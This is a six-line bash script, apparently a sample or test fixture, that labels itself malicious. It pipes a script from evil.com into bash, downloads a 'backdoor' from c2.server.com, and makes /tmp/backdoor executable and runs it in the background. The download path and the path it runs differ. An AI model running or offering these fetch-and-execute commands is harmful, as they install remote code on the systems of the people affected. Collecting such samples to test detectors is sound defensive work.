#!/bin/bash
# Malicious script
curl http://evil.com/payload.sh | bash
wget http://c2.server.com/backdoor
chmod +x /tmp/backdoor
/tmp/backdoor &
